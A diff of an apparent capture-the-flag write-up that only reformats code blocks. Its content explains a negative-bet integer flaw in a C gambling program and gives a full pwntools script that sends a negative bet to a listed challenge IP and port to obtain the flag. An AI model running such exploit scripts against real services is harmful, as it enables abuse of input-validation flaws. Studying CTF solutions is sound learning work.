@@ -7,10 +7,10 @@ In the C code, the check for your bet is:
 
 **C**
 
-`if (bet > coins) {
-    printf("Invalid bet.\n");
-    continue;
-}`
+    if (bet > coins) {
+        printf("Invalid bet.\n");
+        continue;
+    }
 
 While `coins` is an `int` (initialized to 1), the variable `bet` is also a **signed integer** (from `scanf("%d", &bet)`). In signed integer logic, **any negative number is less than 1**.
 
@@ -36,57 +36,57 @@ We will use `pwntools`, which is the standard library for CTF exploit scripts.
 
 **Python**
 
-`from pwn import *
-
-# Connection details
-HOST = '133.88.122.244'
-PORT = 30757
-
-def solve():
-    # Start the connection
-    io = remote(HOST, PORT)
-
-    # We have 10 rounds, we only need to hit the "else" branch once
-    # with a large negative number.
-    negative_bet = "-2000000000"
-
-    try:
-        for i in range(10):
-            # Wait until the program asks for the bet
-            io.recvuntil(b"Bet: ")
-            
-            log.info(f"Round {i+1}: Sending negative bet {negative_bet}")
-            io.sendline(negative_bet.encode())
-
-            # Read the result of the round
-            result = io.recvline().decode()
-            print(result.strip())
-
-            # If we see "Flag:", we won!
-            if "Flag:" in result:
-                # Sometimes the flag is on the same line or the next
-                remaining = io.recvall(timeout=2).decode()
-                print(remaining)
-                break
-            
-            # Check if we hit SUCCESS (which means we lost coins because bet was negative)
-            # or FAILURE (which means we gained coins)
-            if "SUCCESS" in result:
-                log.warning("Unlucky! The rand() made us 'win', losing coins. Trying next round...")
-            elif "FAILURE" in result:
-                log.success("Hit the subtraction logic! Checking for flag...")
-                # The flag should be printed now if coins > 1000
-                flag_line = io.recvall(timeout=2).decode()
-                print(flag_line)
-                break
-
-    except EOFError:
-        log.error("Connection closed.")
-    finally:
-        io.close()
-
-if __name__ == "__main__":
-    solve()`
+    from pwn import *
+    
+    # Connection details
+    HOST = '133.88.122.244'
+    PORT = 30757
+    
+    def solve():
+        # Start the connection
+        io = remote(HOST, PORT)
+    
+        # We have 10 rounds, we only need to hit the "else" branch once
+        # with a large negative number.
+        negative_bet = "-2000000000"
+    
+        try:
+            for i in range(10):
+                # Wait until the program asks for the bet
+                io.recvuntil(b"Bet: ")
+                
+                log.info(f"Round {i+1}: Sending negative bet {negative_bet}")
+                io.sendline(negative_bet.encode())
+    
+                # Read the result of the round
+                result = io.recvline().decode()
+                print(result.strip())
+    
+                # If we see "Flag:", we won!
+                if "Flag:" in result:
+                    # Sometimes the flag is on the same line or the next
+                    remaining = io.recvall(timeout=2).decode()
+                    print(remaining)
+                    break
+                
+                # Check if we hit SUCCESS (which means we lost coins because bet was negative)
+                # or FAILURE (which means we gained coins)
+                if "SUCCESS" in result:
+                    log.warning("Unlucky! The rand() made us 'win', losing coins. Trying next round...")
+                elif "FAILURE" in result:
+                    log.success("Hit the subtraction logic! Checking for flag...")
+                    # The flag should be printed now if coins > 1000
+                    flag_line = io.recvall(timeout=2).decode()
+                    print(flag_line)
+                    break
+    
+        except EOFError:
+            log.error("Connection closed.")
+        finally:
+            io.close()
+    
+    if __name__ == "__main__":
+        solve()
 
 ### **Why this works**
 
